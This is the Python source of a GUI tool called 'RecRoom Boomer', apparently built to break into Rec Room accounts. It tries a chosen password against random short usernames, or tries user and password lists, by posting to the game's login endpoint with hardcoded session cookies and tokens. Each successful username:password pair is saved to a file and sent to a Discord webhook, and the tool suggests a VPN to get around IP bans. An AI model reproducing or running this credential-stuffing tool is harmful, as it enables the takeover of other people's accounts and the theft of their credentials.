import customtkinter
import os
from customtkinter import *
from colorama import Fore , Back , Style
import colorama
import requests
import random
colorama.init(autoreset = True)
import threading
from dhooks import *
from licensing.models import *
from licensing.methods import Key, Helpers
import easygui
import base64




ABC = 'abcdefghigklmnopqrstuvwxyz123456789_-.'






class App(customtkinter.CTk):
    def __init__(self):
        super().__init__()
        leen = requests.get("https://bin.sx/documents/nbeqdm8BuT")
        lenj=leen.json()
        dt=lenj['data']

        self.title("RecRoom Boomer | V1.2")
        self.geometry("700x450")


        
        # set grid layout 1x2
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(1, weight=1)



            
  
        var1=StringVar()  


        url = "https://auth.rec.net/Account/Login?ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Drecnet%26redirect_uri%3Dhttps%253A%252F%252Frec.net%252Fauthenticate%252Fdefault%26response_type%3Did_token%2520token%26scope%3Dopenid%2520rn.api%2520rn.commerce%2520rn.notify%2520rn.match.read%2520rn.chat%2520rn.accounts%2520rn.auth%2520rn.link%2520rn.clubs%2520rn.rooms%2520rn.discovery%26state%3D9eb9eb4b9e7c4efd8182e038b77fc730%26nonce%3Df0e2e7d9f9994e3f8245b062de3471c7"


        header = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "ar",
            "Cache-Control": "max-age=0",
            "Connection": "keep-alive",
            "Content-Length": "293",
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "auth.rec.net",
            "Origin": "https://auth.rec.net",
            "Referer": "https://auth.rec.net/Account/Login?ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Drecnet%26redirect_uri%3Dhttps%253A%252F%252Frec.net%252Fauthenticate%252Fdefault%26response_type%3Did_token%2520token%26scope%3Dopenid%2520rn.api%2520rn.commerce%2520rn.notify%2520rn.match.read%2520rn.chat%2520rn.accounts%2520rn.auth%2520rn.link%2520rn.clubs%2520rn.rooms%2520rn.discovery%26state%3D9eb9eb4b9e7c4efd8182e038b77fc730%26nonce%3Df0e2e7d9f9994e3f8245b062de3471c7",
            "sec-ch-ua": '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "Windows",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
            "Cookie": "TiPMix=15.970563627530742; x-ms-routing-name=self; ARRAffinity=31506998aae23a5d0d828908c87319f274d3557015beab5c19a9556fd83b3613; ARRAffinitySameSite=31506998aae23a5d0d828908c87319f274d3557015beab5c19a9556fd83b3613; _gcl_au=1.1.1424970639.1675605601; amplitude_id_e1693a1003671058b6abc356c8ba8d59rec.net=eyJkZXZpY2VJZCI6IjU1NDgyZTU0LWZhZDItNGVlMS1iZGVkLTY2YjZjNTA3YTQ1MVIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTY3NTYwNTYwMzA2NSwibGFzdEV2ZW50VGltZSI6MTY3NTYwNTYwMzA2NSwiZXZlbnRJZCI6MCwiaWRlbnRpZnlJZCI6MCwic2VxdWVuY2VOdW1iZXIiOjB9; rl_user_id=RudderEncrypt%3AU2FsdGVkX1%2BdgMKBbPV1W6CTARSuvjYdzMIQngkxzVI%3D; rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX19j1BwsU%2F%2B%2FbjAHrBc%2FGMqbA%2Fy9aOSj2TBcas2Qh1pp8e5z5u4L0haT%2FlvS6dh1iPYnta8LBK0ksg%3D%3D; rl_group_id=RudderEncrypt%3AU2FsdGVkX1%2B6rgmuutpwIUZy%2FY6LfePmQS%2FCH9u58Vs%3D; rl_trait=RudderEncrypt%3AU2FsdGVkX19dbG94YLqIdJpKrwt09IzKxozdTklY4F8%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX1%2FDCnSSOC8KKA%2BUtudZ0D3pU58RaevrMv4%3D; rl_page_init_referrer=RudderEncrypt%3AU2FsdGVkX1%2FC6l5N0OOUovJAvCZYeDPRd7DrYJp7g8U%3D; rl_page_init_referring_domain=RudderEncrypt%3AU2FsdGVkX19ZSNPetE2WY%2Fyu6MXyc%2Ftpu5yQ8YxBSjY%3D; OptanonConsent=isGpcEnabled=0&datestamp=Sun+Feb+05+2023+17%3A00%3A03+GMT%2B0300+(Arabian+Standard+Time)&version=6.38.0&isIABGlobal=false&hosts=&landingPath=https%3A%2F%2Frec.net%2F&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1; .AspNetCore.Antiforgery.9fXoN5jHCXs=CfDJ8AHuddZ3vf1MnoSPGciZqC3UlrWK91YBQbZ7DZYXMlvgFMM2VMkO5Z4DxKr23LyGyA_rBX35JMllAimnz9SiDQsiTGc5mXU11EzeSwXO31rPXSJTP73_Y9gzMqx2b9NvF6wnmu7xrBHY3riCA4HGZ5Y; ai_user=icdtsFIPFPa06mNoluR4LC|2023-02-05T14:00:06.160Z; ai_session=WPqBTCC7l1ZG1jgKd+KpEm|1675605606498|1675605606488"
        }
        running = True

        def recoroom_boomer():
            WEBHOOK=self.webhook.get()
            hook = Webhook(WEBHOOK)
            PASSWORD=self.password1.get()
            for i in range(999999):
                length=int(combobox.get())
                listnames = str("".join(random.choice(ABC)for x in range(length)))
                payload = {
                    "Input.Username": listnames,
                    "Input.Password": PASSWORD,
                    "Input.RememberMe": True,
                    "button": "login",
                    "__RequestVerificationToken": "CfDJ8AHuddZ3vf1MnoSPGciZqC1Xe6zwcv5E4IGfzx5dxq09UDSlPPWsqaX67zOakq651du9m-VDO9fHWR2orRbB5aak6Ai1laJ1giESjWcLZQdZFUVVqG7b_MzLFfKqEmh-Tq9jcYAVbxfEqR-Q-Jjf5TA",
                    "Input.RememberMe": False
                    }
                session = requests.Session()
                session.max_redirects = int(300)
                ck= requests.get(f"https://accounts.rec.net/account?username={listnames}")
                if ck.status_code ==int(200):
                    r = session.post(url=url,headers=header,data=payload,allow_redirects=True,timeout=int(10))
                    print(listnames)
                    self.textbox.insert("0.0", f"{listnames}\n")
                    if r.status_code == int(404):
                        embed = Embed(
                            description=f'Sniped **{listnames}** <a:ak47:1073277248280477819> ',
                            color=0xffcb00,
                            timestamp='now'  # sets the timestamp to current time
                            )
                        embed.set_author(name='RecRoom Boomer', icon_url="https://cdn.discordapp.com/attachments/884850906158481448/1104286743336865793/f4cc01d25c1715fa3e8068e2b83ff171.gif")
                        embed.add_field(name='Username:', value=f'{listnames}')
                        embed.add_field(name='Password:', value=f'||{PASSWORD}||')
                        embed.add_field(name='URL:', value=f'https://rec.net/user/{listnames}')
                        embed.set_footer(text=f'{dt}', icon_url="https://cdn.discordapp.com/attachments/884850906158481448/1104286503636574268/dd857c9277df58b12227e420a96c158e.gif")
                        hook.send(embed=embed)
                        self.textbox.insert("0.0", f"✅ | Vaild {listnames}\n")
                        self.textbox.insert("0.0", f"✅ | Vaild {listnames}\n")
                        self.textbox.insert("0.0", f"✅ | Vaild {listnames}\n")
                        self.textbox.insert("0.0", f"✅ | Vaild {listnames}\n")
                        print(f"{Fore.GREEN}{listnames}")
                        print(f"{Fore.GREEN}{listnames}")
                        print(f"{Fore.GREEN}{listnames}")
                        print(f"{Fore.GREEN}{listnames}")
                        with open("vaild.txt","a+") as file:
                            file.write(f"{listnames}:{PASSWORD}")
                            file.write("\n")
                        print(r.status_code)
                    elif r.status_code == 429:
                        self.textbox.insert("0.0", f"⚠ | Ratelimit\n")
                    elif r.status_code == 403:
                        self.textbox.insert("0.0", f"⚠ | Ip Banned (Use VPN)\n")

            
        def quit3():
            quit()


        def rer():
            global running
            running = True
            recboom = threading.Thread(target=recoroom_boomer)
            recboomer=recboom.start()
            var2="Started" 
            var1.set(var2)
        var1=StringVar()


        def stoper():
            global running
            running = False
            var2="Stopped" 
            var1.set(var2)
            self.textbox.insert("0.0", "Stopped\n")

        def optionmenu_callback(choice):
            print("optionmenu dropdown clicked:", choice)

        def recoroom_boomer2():
            print(passlist)
            print(userlist)
            WEBHOOK=self.webhook2.get()
            hook = Webhook(WEBHOOK)
            for i in range(999999):
                for passw in passlist:
                    for user in userlist:
                        payload = {
                            "Input.Username": user,
                            "Input.Password": passw,
                            "Input.RememberMe": True,
                            "button": "login",
                            "__RequestVerificationToken": "CfDJ8AHuddZ3vf1MnoSPGciZqC1Xe6zwcv5E4IGfzx5dxq09UDSlPPWsqaX67zOakq651du9m-VDO9fHWR2orRbB5aak6Ai1laJ1giESjWcLZQdZFUVVqG7b_MzLFfKqEmh-Tq9jcYAVbxfEqR-Q-Jjf5TA",
                            "Input.RememberMe": False
                            }
                        session = requests.Session()
                        session.max_redirects = int(300)
                        print(passw)
                        print(user)
                        ck= requests.get(f"https://accounts.rec.net/account?username={user}")
                        if ck.status_code ==int(200):
                            r = session.post(url=url,headers=header,data=payload,allow_redirects=True,timeout=int(10))
                            print(user)
                            self.textbox2.insert("0.0", f"{user}\n")
                            if r.status_code == int(404):
                                embed = Embed(
                                    description=f'Sniped **{user}** <a:ak47:1073277248280477819> ',
                                    color=0xffcb00,
                                    timestamp='now'  # sets the timestamp to current time
                                    )
                                embed.set_author(name='RecRoom Boomer', icon_url="https://cdn.discordapp.com/attachments/1041080852462973008/1073281164284006521/AAuE7mApZN54Srd6RX7yEbJ8C3VlwdZWKHathmXNIAs900-mo-c-c0xffffffff-rj-k-no.png")
                                embed.add_field(name='Username:', value=f'{user}')
                                embed.add_field(name='Password:', value=f'||{passw}||')
                                embed.add_field(name='URL:', value=f'https://rec.net/user/{user}')
                                embed.set_footer(text='Made by irtco#0702', icon_url="https://cdn.discordapp.com/attachments/1041080852462973008/1073279919041282098/irtco_store.png")
                                hook.send(embed=embed)
                                self.textbox2.insert("0.0", f"✅ | Vaild {user}\n")
                                self.textbox2.insert("0.0", f"✅ | Vaild {user}\n")
                                self.textbox2.insert("0.0", f"✅ | Vaild {user}\n")
                                self.textbox2.insert("0.0", f"✅ | Vaild {user}\n")
                                print(f"{Fore.GREEN}{user}")
                                print(f"{Fore.GREEN}{user}")
                                print(f"{Fore.GREEN}{user}")
                                print(f"{Fore.GREEN}{user}")
                                with open("vaild.txt","a+") as file:
                                    file.write(f"{user}:{passw}")
                                    file.write("\n")
                                print(r.status_code)
                            elif r.status_code == 429:
                                self.textbox.insert("0.0", f"⚠ | Ratelimit\n")
                            elif r.status_code == 403:
                                self.textbox.insert("0.0", f"⚠ | Ip Banned (Use VPN)\n")
        
        def rer2():
            global running
            running = True
            recboom2 = threading.Thread(target=recoroom_boomer2)
            recboomer=recboom2.start()


        def passwordlist():
            global passlist
            passlist = open(easygui.fileopenbox(), 'r').read().splitlines()

        
        def userslist():
            global userlist
            userlist = open(easygui.fileopenbox(), 'r').read().splitlines()

        # load images with light and dark mode image
        # create navigation frame
        self.navigation_frame = customtkinter.CTkFrame(self, corner_radius=0)
        self.navigation_frame.grid(row=0, column=0, sticky="nsew")
        self.navigation_frame.grid_rowconfigure(4, weight=1)

        self.navigation_frame_label = customtkinter.CTkLabel(self.navigation_frame, text="  RecRoom Boomer", 
                                                             compound="left", font=customtkinter.CTkFont(size=15, weight="bold"))
        self.navigation_frame_label.grid(row=0, column=0, padx=20, pady=20)

        self.home_button = customtkinter.CTkButton(self.navigation_frame, corner_radius=0, height=40, border_spacing=10, text="Home",
                                                   fg_color="transparent", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"),
                                                    anchor="w", command=self.home_button_event)
        self.home_button.grid(row=1, column=0, sticky="ew")

        self.frame_2_button = customtkinter.CTkButton(self.navigation_frame, corner_radius=0, height=40, border_spacing=10, text="RecRoom Guess",
                                                      fg_color="transparent", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"),
                                                       anchor="w", command=self.frame_2_button_event)
        self.frame_2_button.grid(row=2, column=0, sticky="ew")

        self.frame_3_button = customtkinter.CTkButton(self.navigation_frame, corner_radius=0, height=40, border_spacing=10, text="RecRoom Guess (list)",
                                                      fg_color="transparent", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"),
                                                       anchor="w", command=self.frame_3_button_event)
        self.frame_3_button.grid(row=3, column=0, sticky="ew")

        self.appearance_mode_menu = customtkinter.CTkOptionMenu(self.navigation_frame, values=["Light", "Dark", "System"],
                                                                command=self.change_appearance_mode_event)
        self.appearance_mode_menu.grid(row=6, column=0, padx=20, pady=20, sticky="s")

        # create home frame
        self.home_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.home_frame.grid_columnconfigure(0, weight=1)

        LICENSE = requests.get("https://pastebin.com/raw/DSpZ5WBS")

        self.home_frame_textbox = customtkinter.CTkTextbox(self.home_frame, width=500, corner_radius=0)
        self.home_frame_textbox.place(relx=0.01, rely=0.2)
        self.home_frame_textbox.insert("0.0", LICENSE.content * 1)
        comboboxt = customtkinter.CTkLabel(self.home_frame, text="LICENSE:",width=100, height=90)
        comboboxt.place(relx=0.46, rely=0.1, anchor=customtkinter.CENTER)
        self.home_frame_button_5 = customtkinter.CTkButton(self.home_frame, text="                Quit",  compound="bottom", anchor="w", fg_color="red",command=quit3)
        self.home_frame_button_5.place(relx=0.35, rely=0.8)

        # create second frame
        self.second_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.second_frame_button_4 = customtkinter.CTkButton(self.second_frame, text="                Start",  compound="bottom", anchor="w",command=rer, fg_color="green")
        self.second_frame_button_4.place(relx=0.6, rely=0.1)
        self.second_frame_button_5 = customtkinter.CTkButton(self.second_frame, text="                Stop",  compound="bottom", anchor="w", fg_color="red",command=stoper)
        self.second_frame_button_5.place(relx=0.6, rely=0.18)
        self.password1 = customtkinter.CTkEntry(self.second_frame, placeholder_text="Password?")
        self.password1.place(relx=0.06,rely=0.13)
        label6 = customtkinter.CTkLabel(self.second_frame, text="Password:")
        label6.place(relx=0.1, rely=0.1, anchor=customtkinter.CENTER)
        label9 = customtkinter.CTkLabel(self.second_frame, textvariable=var1)
        label9.place(relx=0.1, rely=0.3, anchor=customtkinter.CENTER)
        self.textbox = customtkinter.CTkTextbox(self.second_frame, width=400, corner_radius=0)
        self.textbox.place(relx=0.09, rely=0.5)
        self.textbox.insert("0.0", f"{dt}\n"  * 1)
        self.textbox.insert("0.0", "<----------------Console---------------->\n" * 1)
        self.webhook = customtkinter.CTkEntry(self.second_frame, placeholder_text="Webhook?",width=400)
        self.webhook.place(relx=0.06,rely=0.38)
        label_webhook = customtkinter.CTkLabel(self.second_frame, text="Discord Webhook:")
        label_webhook.place(relx=0.115, rely=0.343, anchor=customtkinter.CENTER)
        combobox = customtkinter.CTkOptionMenu(self.second_frame,
                                       values=["2", "3","4","5"],
                                       command=optionmenu_callback,
                                       width=50)
        combobox.place(relx=0.38,rely=0.13)
        comboboxt = customtkinter.CTkLabel(self.second_frame, text="length:")
        comboboxt.place(relx=0.42, rely=0.1, anchor=customtkinter.CENTER)





        # create third frame
        self.third_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.third_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.third_frame_button_4 = customtkinter.CTkButton(self.third_frame, text="                Start",  compound="bottom", anchor="w",command=rer2, fg_color="green")
        self.third_frame_button_4.place(relx=0.6, rely=0.1)
        self.third_frame_button_5 = customtkinter.CTkButton(self.third_frame, text="                Stop",  compound="bottom", anchor="w", fg_color="red",command=stoper)
        self.third_frame_button_5.place(relx=0.6, rely=0.18)
        self.password2 = customtkinter.CTkButton(self.third_frame, text="Password List", command=passwordlist,width=100,fg_color="indigo")
        self.password2.place(relx=0.06,rely=0.13)
        self.users = customtkinter.CTkButton(self.third_frame, text="Users List", command=userslist,width=100,fg_color="indigo")
        self.users.place(relx=0.27,rely=0.13)
        label4 = customtkinter.CTkLabel(self.third_frame, textvariable=var1)
        label4.place(relx=0.1, rely=0.3, anchor=customtkinter.CENTER)
        self.textbox2 = customtkinter.CTkTextbox(self.third_frame, width=400, corner_radius=0)
        self.textbox2.place(relx=0.09, rely=0.5)
        self.textbox2.insert("0.0", f"{dt}\n" * 1)
        self.textbox2.insert("0.0", "<----------------Console---------------->\n" * 1)
        self.webhook2 = customtkinter.CTkEntry(self.third_frame, placeholder_text="Webhook?",width=400)
        self.webhook2.place(relx=0.06,rely=0.38)
        label_webhook2 = customtkinter.CTkLabel(self.third_frame, text="Discord Webhook:")
        label_webhook2.place(relx=0.115, rely=0.343, anchor=customtkinter.CENTER)


        # select default frame
        self.select_frame_by_name("home")

    def select_frame_by_name(self, name):
        # set button color for selected button
        self.home_button.configure(fg_color=("gray75", "gray25") if name == "home" else "transparent")
        self.frame_2_button.configure(fg_color=("gray75", "gray25") if name == "frame_2" else "transparent")
        self.frame_3_button.configure(fg_color=("gray75", "gray25") if name == "frame_3" else "transparent")

        # show selected frame
        if name == "home":
            self.home_frame.grid(row=0, column=1, sticky="nsew")
        else:
            self.home_frame.grid_forget()
        if name == "frame_2":
            self.second_frame.grid(row=0, column=1, sticky="nsew")
        else:
            self.second_frame.grid_forget()
        if name == "frame_3":
            self.third_frame.grid(row=0, column=1, sticky="nsew")
        else:
            self.third_frame.grid_forget()

    def home_button_event(self):
        self.select_frame_by_name("home")

    def frame_2_button_event(self):
        self.select_frame_by_name("frame_2")
        

    def frame_3_button_event(self):
        self.select_frame_by_name("frame_3")

    def change_appearance_mode_event(self, new_appearance_mode):
        customtkinter.set_appearance_mode(new_appearance_mode)




if __name__ == "__main__":
            app = App()
            app.mainloop()




